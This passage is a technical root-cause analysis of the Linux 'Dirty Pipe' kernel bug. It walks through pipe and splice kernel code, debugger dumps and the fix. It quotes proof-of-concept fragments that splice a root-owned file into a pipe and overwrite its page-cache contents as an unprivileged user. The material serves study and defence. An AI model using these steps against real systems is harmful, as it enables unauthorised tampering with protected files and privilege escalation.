When handling a `write()` to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to `page` of the `pipe_buffer` that is currently the `head` of the ring. Whether or not this is possible is decided by three things: 

- is the pipe non-empty (line 23)
- is the `PIPE_BUF_FLAG_CAN_MERGE` flag set? (line 28)
- is there is enough space left on the page? (line 29)

If the answer to all of those questions is *yes* the kernel starts the write by appending to the existing page.

To complete the rest of the write the kernel advances the `head` to the next `pipe_buffer`, allocates a fresh `page` for it, initializes the flags (the`PIPE_BUF_FLAG_CAN_MERGE` flag will be set, unless the user explicitly asked for the pipe to be in `O_DIRECT` mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the `O_DIRECT` mode of `pipe()`:

```
[...]
O_DIRECT (since Linux 3.4)
              Create a pipe that performs I/O in "packet" mode.  Each
              write(2) to the pipe is dealt with as a separate packet,
              and read(2)s from the pipe will read one packet at a time.
[...]
```
[source](https://www.man7.org/linux/man-pages/man2/pipe.2.html)

This is handled in the `if`-condition `is_packetized(filp)` in `pipe_write()` (see above).

We can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.

```
struct pipe_buffer at 0xffff888101f8a180
> 'page': 0xffffea00040e3bc0
> 'offset': 0
> 'len': 8
> 'ops': 0xffffffff8221bb00 <anon_pipe_buf_ops>
> 'flags': PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea00040e3bc0
> virtual: 0xffff8881038ef000
> data: b'AAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

All subsequent writes go down the "append path" and fill the existing page.

```
struct pipe_buffer at 0xffff888101f8a180
> 'page': 0xffffea00040e3bc0
> 'offset': 0
> 'len': 4096
> 'ops': 0xffffffff8221bb00 <anon_pipe_buf_ops>
> 'flags': PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea00040e3bc0
> virtual: 0xffff8881038ef000
> data: b'AAAAAAAAAAAAAAAAAAAA'[...]b'AAAAAAAAAAAAAAAAAAAA'
```

### Reading

Next, the POC drains the pipe by consuming / `read`ing all the `A`s from the reading end.

```c
void
drain_pipe(int pipefd_r) {
    char buf[8];
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (i == PAGESIZE / 8) {
            pause_for_inspection("About to perform last read() from pipe");
        }
        if (read(pipefd_r, buf, 8) != 8) {
            exit(1);
        }
    }
}
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L34)

The case where a process asks the kernel to `read()` from a pipe is handled by the function `pipe_read()`. 

```c
static ssize_t
pipe_read(struct kiocb *iocb, struct iov_iter *to)
{
	size_t total_len = iov_iter_count(to);
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	bool was_full, wake_next_reader = false;
	ssize_t ret;
...
	ret = 0;
	__pipe_lock(pipe);

	/*
	 * We only wake up writers if the pipe was full when we started
	 * reading in order to avoid unnecessary wakeups.
	 *
	 * But when we do wake up writers, we do so using a sync wakeup
	 * (WF_SYNC), because we want them to get going and generate more
	 * data for us.
	 */
	was_full = pipe_full(pipe->head, pipe->tail, pipe->max_usage);
	for (;;) {
		/* Read ->head with a barrier vs post_one_notification() */
		unsigned int head = smp_load_acquire(&pipe->head);
		unsigned int tail = pipe->tail;
		unsigned int mask = pipe->ring_size - 1;
...
		if (!pipe_empty(head, tail)) {
			struct pipe_buffer *buf = &pipe->bufs[tail & mask];
			size_t chars = buf->len;
			size_t written;
			int error;

			if (chars > total_len) {
...
				chars = total_len;
			}
...
			written = copy_page_to_iter(buf->page, buf->offset, chars, to);
...
			ret += chars;
			buf->offset += chars;
			buf->len -= chars;
...
			if (!buf->len) {
				pipe_buf_release(pipe, buf);
...
				tail++;
				pipe->tail = tail;
...
			}
			total_len -= chars;
			if (!total_len)
				break;	/* common path: read succeeded */
			if (!pipe_empty(head, tail))	/* More to do? */
				continue;
		}

		if (!pipe->writers)
			break;
		if (ret)
			break;
		if (filp->f_flags & O_NONBLOCK) {
			ret = -EAGAIN;
			break;
		}
		...
	}
...
	if (ret > 0)
		file_accessed(filp);
	return ret;
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L231)

If the pipe is non-empty, the data is taken from the `tail`-indexed `pipe_buffer` (in `bufs`). In case, a buffer is emptied during a read, the `release` function pointer of the `ops` field of the `pipe_buffer` is executed. For a `pipe_buffer` that was initialized by an earlier `write()`, the `ops` field is a pointer to the `struct pipe_buf_operations anon_pipe_buf_ops`. 

```c
static const struct pipe_buf_operations anon_pipe_buf_ops = {
	.release	= anon_pipe_buf_release,
	.try_steal	= anon_pipe_buf_try_steal,
	.get		= generic_pipe_buf_get,
};
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L214)
```c
/**
 * pipe_buf_release - put a reference to a pipe_buffer
 * @pipe:	the pipe that the buffer belongs to
 * @buf:	the buffer to put a reference to
 */
static inline void pipe_buf_release(struct pipe_inode_info *pipe,
				    struct pipe_buffer *buf)
{
	const struct pipe_buf_operations *ops = buf->ops;

	buf->ops = NULL;
	ops->release(pipe, buf);
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L197)
```c
static void anon_pipe_buf_release(struct pipe_inode_info *pipe,
				  struct pipe_buffer *buf)
{
	struct page *page = buf->page;

	/*
	 * If nobody else uses this page, and we don't already have a
	 * temporary page, let's keep track of it as a one-deep
	 * allocation cache. (Otherwise just release our reference to it)
	 */
	if (page_count(page) == 1 && !pipe->tmp_page)
		pipe->tmp_page = page;
	else
		put_page(page);
}
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L125)

Thus, `anon_pipe_buf_release()` is executed, which calls `put_page()` to release our reference to the page. Note that while the `ops` pointer is set to NULL to signal that be buffer has been released, the `page` and `flags` fields of the `pipe_buffer` are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are "uninitialized". We can confirm this by printing the pipe structures after the last read.

```
struct pipe_inode_info at 0xffff8881044aec00
> 'head': 1
> 'tail': 1
> 'ring_size': 1
> 'bufs': 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
> 'page': 0xffffea00040e3bc0
> 'offset': 4096
> 'len': 0
> 'ops': NULL
> 'flags': PIPE_BUF_FLAG_CAN_MERGE
```

### Summary

For us, the key takeaways are:

1. Writes to a pipe can append to the `page` of a `pipe_buffer` if its `PIPE_BUF_FLAG_CAN_MERGE` flag is set.
2. This flag is set by default for buffers that are initialized by writes.
3. Emptying a pipe with a `read()` leaves the `pipe_buffer`s' flags unmodified.

However, `write`s to a pipe are not the only way fill it!
    
## Pipes (splicing)

Besides reading and writing, the Linux programming interface also offers the `splice` syscall for moving data from or to a pipe. This is what our PoC does next.
```c
    pause_for_inspection("About to splice() file to pipe");
    if (splice(tfd, 0, pipefds[1], 0, 5, 0) < 0) {
        exit(1);
    }
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L76)
Since this syscall may not be as well-known as the others, let's briefly discuss it from a user's perspective.

### The `splice` System Call (user land)
```
SPLICE(2)                       Linux Programmer's Manual                      SPLICE(2)

NAME
       splice - splice data to/from a pipe

SYNOPSIS
       #define _GNU_SOURCE         /* See feature_test_macros(7) */
       #include <fcntl.h>

       ssize_t splice(int fd_in, off64_t *off_in, int fd_out,
                      off64_t *off_out, size_t len, unsigned int flags);

DESCRIPTION
       splice()  moves  data between two file descriptors without copying between kernel
       address space and user address space.  It transfers up to len bytes of data  from
       the  file  descriptor  fd_in to the file descriptor fd_out, where one of the file
       descriptors must refer to a pipe.

       The following semantics apply for fd_in and off_in:
    
       *  If fd_in refers to a pipe, then off_in must be NULL.
    
       *  If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from
          fd_in starting from the file offset, and the file offset is adjusted appropri‐
          ately.
    
       *  If fd_in does not refer to a pipe and off_in is not  NULL,  then  off_in  must
          point to a buffer which specifies the starting offset from which bytes will be
          read from fd_in; in this case, the file offset of fd_in is not changed.
    
       Analogous statements apply for fd_out and off_out.
```

As mentioned above, a process can obtain a file descriptor using the `sys_open` system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could `read()` the data from the file into a buffer in its memory (or `mmap()` the file) and then `write()` it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the `sys_splice` system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure.
One of `fd_in` or `fd_out` must be a pipe. The other `fd_xxx` can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann's original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out [this](https://web.archive.org/web/20130521163124/http://kerneltrap.org/node/6505) to read how Linus Torvalds himself explains the `splice` system call 8-)

### The `splice` System Call (Implementation)

The *very* high level idea of the `splice` implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory.
![](https://i.imgur.com/nHzmRxN.png)

To see that this figure is correct, we start from the system call's entry point `SYSCALL_DEFINE6(splice,...)`, and first arrive at the function `__do_splice()` that is responsible for copying the offset values from and to user space. The called function `do_splice()` determines if we want to splice to, from or between pipes. In the first case the function 

```c
static long do_splice_to(struct file *in, loff_t *ppos,
			 struct pipe_inode_info *pipe, size_t len,
			 unsigned int flags);
```

is called, which executes

```c
in->f_op->splice_read(in, ppos, pipe, len, flags);
```

[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/splice.c#L773)

From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the `ext2` file system, the correct implementation is found in `ext2_file_operations`. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path... we'll meet again later ;) If you interested in this nice abstraction check out the [Linux Virtual File System](https://www.kernel.org/doc/html/latest/filesystems/vfs.html) documentation.

```c
const struct file_operations ext2_file_operations = {
...
	.read_iter	= ext2_file_read_iter,
...
	.splice_read	= generic_file_splice_read,
...
};
```

[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/fs/ext2/file.c#L182)

Calling `generic_file_splice_read()` (eventually...) leads us to `filemap_read()`. Notice that at this point we switch from the file system `fs/` into the [memory management](https://www.kernel.org/doc/html/latest/core-api/mm-api.html) `mm/` subsystem of the kernel.

```c
/**
 * filemap_read - Read data from the page cache.
 * @iocb: The iocb to read.
 * @iter: Destination for the data.
 * @already_read: Number of bytes already read by the caller.
 *
 * Copies data from the page cache.  If the data is not currently present,
 * uses the readahead and readpage address_space operations to fetch it.
 *
 * Return: Total number of bytes copied, including those already read by
 * the caller.  If an error happens before any bytes are copied, returns
 * a negative error number.
 */
ssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter,
		ssize_t already_read)
{
	struct file *filp = iocb->ki_filp;
	struct file_ra_state *ra = &filp->f_ra;
	struct address_space *mapping = filp->f_mapping;
	struct inode *inode = mapping->host;
	struct folio_batch fbatch;
...
        folio_batch_init(&fbatch);
...
    do {
...
		error = filemap_get_pages(iocb, iter, &fbatch);
...
		for (i = 0; i < folio_batch_count(&fbatch); i++) {
			struct folio *folio = fbatch.folios[i];
			size_t fsize = folio_size(folio);
			size_t offset = iocb->ki_pos & (fsize - 1);
			size_t bytes = min_t(loff_t, end_offset - iocb->ki_pos,
					     fsize - offset);
			size_t copied;
...
			copied = copy_folio_to_iter(folio, offset, bytes, iter);
            
			already_read += copied;
			iocb->ki_pos += copied;
			ra->prev_pos = iocb->ki_pos;
...
		}
...
		folio_batch_init(&fbatch);
	} while (iov_iter_count(iter) && iocb->ki_pos < isize && !error);
...
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/mm/filemap.c#L2645)

In this function the actual copying (again no real byte-for-byte copy... see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to `copy_folio_to_iter()`. Note that a [folio](https://lwn.net/Articles/849538/) is not quite the same as a page, but for our purposes this doesn't matter.

```c
copied = copy_folio_to_iter(folio, offset, bytes, iter);
```

Besides, however, that if we look closer at the  implementation of this operation in `copy_page_to_iter_pipe()`, we notice that the data is not actually copied at all!

```c
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
...
struct pipe_inode_info *pipe = i->pipe;
struct pipe_buffer *buf;
unsigned int p_mask = pipe->ring_size - 1;
unsigned int i_head = i->head;
size_t off;
...
off = i->iov_offset;
buf = &pipe->bufs[i_head & p_mask];
if (off) {
	if (offset == off && buf->page == page) {
	    /* merge with the last one */
		buf->len += bytes;
		i->iov_offset += bytes;
		goto out;
	}
	i_head++;
	buf = &pipe->bufs[i_head & p_mask];
}
...
	buf->ops = &page_cache_pipe_buf_ops;

	get_page(page);
	buf->page = page;
	buf->offset = offset;
	buf->len = bytes;
...
```
[`⬀ go to source code`](https://elixir.bootlin.com/linux/v5.17.9/source/lib/iov_iter.c#L382)
    
We first try to 'append' the current copy operation to an earlier one by increasing the `length` of the `pipe_buffer` at `head`. In case this is not possible, we simply advance the `head` and put a *reference to* the page we copy into its `page` field while making sure that `offset` and `length` are set correctly. Indeed, the idea behind the efficiency of `sys_splice` is to implement it as a *zero-copy* operation, where pointers and reference counts are used instead of actually duplicating the data.
 
Clearly this code potentially reuses the `pipe_buffer`s (`buf = &pipe->bufs[i_head & p_mask]`), and thus all fields *must* be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the `flags` is missing. As pointed out by Max Kellermann, it was missing since the [commit](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b) that introduced this function.

### Debugger

We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,

```
struct file at 0xffff8881045b0800
> 'f_mapping': 0xffff8881017d9460
> filename: target_file

struct address_space at 0xffff8881017d9460
> 'a_ops': 0xffffffff82226ce0 <ext4_aops>
> 'i_pages.xa_head' : 0xffffea0004156880

struct page at 0xffffea0004156880
> virtual: 0xffff8881055a2000
> data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

and this is the state of the pipe after splicing

```
struct pipe_inode_info at 0xffff8881044aec00
> 'head': 2
> 'tail': 1
> 'ring_size': 1
> 'bufs': 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
> 'page': 0xffffea0004156880                                        <- same page as before
> 'offset': 0
> 'len': 5
> 'ops': 0xffffffff8221cee0 <page_cache_pipe_buf_ops>
> 'flags': PIPE_BUF_FLAG_CAN_MERGE                                  <- flag still set... oopsie :)
```

The data pointer in the `struct address_space` (which represents the page cache's view on the `target_file`) and the `pipe_buffer` at `head` are equal, while the offset and length reflect what our PoC specified in its call to `splice`. Note that we are reusing the buffer we emptied earlier, re-initializing all fields *but* the flags.

## What's the Actual Problem?

At this point the problem becomes evident. With **anonymous** pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the `PIPE_BUF_FLAG_CAN_MERGE` flag. With the **file-backed buffers**, created by splicing, this should not be allowed by the kernel since those pages are "owned" by the page cache and not by the pipe.

Thus, when we `splice()` the data from a file into a pipe we would have to set `buf->flags = 0` to indicate that it is not okay to  append data to an already existing - not fully written - page (`buf->page`) since this page belongs to the page cache (the file). When we `pipe_write()` (or in our program just `write()`) again we write into the page cache's page because the check `buf->flags & PIPE_BUF_FLAG_CAN_MERGE` is `true` (see `pipe_write` above if you forgot about that part). 

So the main problem is that we start with an anonymous pipe that will then be "turned into" a file-backed pipe (not the whole pipe but some buffers) by the `splice()` but the pipe does not get this information since `buf->flags` is not set to `0` and thus the merging is still allowed. 

The [patch](https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903) is simply adding the missing initialization.

```diff
diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
return 0;
    
    buf->ops = &page_cache_pipe_buf_ops;
+   buf->flags = 0;
    get_page(page);
    buf->page = page;
    buf->offset = offset;
```
As we can see above, our PoC arranged for the `PIPE_BUF_FLAG_CAN_MERGE` flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.
```c
pause_for_inspection("About to write() into page cache");
if (write(pipefds[1], "pwned by user", 13) != 13) {
    exit(1);
}
```
[`⬀ go to source code`](https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L81)

Back in the debugger, we can see that the final invocation of `pipe_write()` appends to the partially filled `pipe_buffer` that is backed by the page cache. 

```
struct address_space at 0xffff8881017d9460
> 'a_ops': 0xffffffff82226ce0 <ext4_aops>
> 'i_pages.xa_head' : 0xffffea0004156880

struct pipe_inode_info at 0xffff8881044aec00
> 'head': 2
> 'tail': 1
> 'ring_size': 1
> 'bufs': 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
> 'page': 0xffffea0004156880
> 'offset': 0
> 'len': 18
> 'ops': 0xffffffff8221cee0 <page_cache_pipe_buf_ops>
> 'flags': PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea0004156880
> virtual: 0xffff8881055a2000
> data: b'File pwned by user!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Here we can see that `owned by root` (starting at index 5 of "File owned by root!") has been overwritten with `pwned by user` in the page cache.

In the shell we can confirm that the file contents changed for all processes on the system

```
user@lkd-debian-qemu:~$ ./poc
user@lkd-debian-qemu:~$ cat target_file
File pwned by user!
user@lkd-debian-qemu:~$ exit
root@lkd-debian-qemu:~# echo 1 > /proc/sys/vm/drop_caches
[  232.397273] bash (203): drop_caches: 1
root@lkd-debian-qemu:~# su user
user@lkd-debian-qemu:~$ cat target_file
File owned by root
```

You can also see that the changes to the file's page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that's the purpose of the page cache).

### Limitations

There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:

> the attacker must have read permissions (because it needs to splice() a page into a pipe)

> the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)

> the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)

> the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)

## Approaches to Understand the Bug

### Top Down vs. Bottom Up vs. Hybrid

Given a PoC and a patch there are different approaches to investigate the vulnerability. 

1. **Top Down**: find the `splice()`, `write()`, `read()` system call implementation and go deeper.

2. **Bottom Up**: have a look at the fix: https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903

   ```diff
   diff --git a/lib/iov_iter.c b/lib/iov_iter.c
   index b0e0acdf96c15e..6dd5330f7a9957 100644
   --- a/lib/iov_iter.c
   +++ b/lib/iov_iter.c
   @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
    		return 0;
    
    	buf->ops = &page_cache_pipe_buf_ops;
   +	buf->flags = 0;
    	get_page(page);
    	buf->page = page;
    	buf->offset = offset;
   @@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
    			break;
    
    		buf->ops = &default_pipe_buf_ops;
   +		buf->flags = 0;
    		buf->page = page;
    		buf->offset = 0;
    		buf->len = min_t(ssize_t, left, PAGE_SIZE);
   ```

   - find `lib/iov_iter.c` (more concrete the functions `copy_page_to_iter_pipe()` and `push_pipe()`) and your way back to the system calls.

3. **Hybrid**: start from `splice()` system call but know where we will end (either of the patched functions from above)

### Linux Kernel Source

Access to the source code:
  - https://github.com/torvalds/linux + ctags + cscope (`make cscope tags`) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel's size!)
  - https://elixir.bootlin.com/linux/v5.17.9/source (cross references already created + no need for extra tools)

When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is *impossible* to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:
  - lots of error checking: in general *very* interesting, however, here we ignore it (i.e. `return -EXYZ` code paths)
  - many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well.
  - structures full of function pointers:
      - for example, look under "Referenced in [...] files" on https://elixir.bootlin.com
      - "decide" for some implementation (in our case ext2 file system)
  - conditional compilation depending on:
      - compile time options: check the config files you used for your build `.config`
      - processor architecture: go for `x86-64` if present, else take the generic version

## Conclusion
TODO mc

A detailed and streamlined analysis of any bug makes it seem shallow, however, don't get fooled by that impression. This bug happened to some of the best C programmers in the wold, was present for years in one of the most widely used OSs, took a professional programmer weeks to pin down, and making sense of it requires a conceptual understanding of two interacting subsystems of the Linux kernel. Root causing it without a PoC, blogpost, and patch at hand is a task that only few can do accomplish (but maybe this post can play a small role in incrementing this number in the future... :).
In general, the nature of this bug makes it a great opportunity for learning about the kernel, and a *missing initialization* vulnerability is a welcome diversion from the [(ostensibly) prevailing](https://github.com/maddiestone/ConPresentations/blob/master/OffensiveCon2022.RealWorld0days.pdf) *memory corruption* issues. Furthermore, in contrast to, say some out-of-bounds write on the heap, the exploitation of this vulnerability is almost trivial, stability is not issue at all, and it works in the same way across a huge range of systems.
While the latter points are probably responsible for its huge popularity, the former two make it a good case study for aspiring security researchers that want to get into kernel stuff. We hope that our setup makes understanding this bug more accessible and provides a good preparation for the inevitable bugs to come.

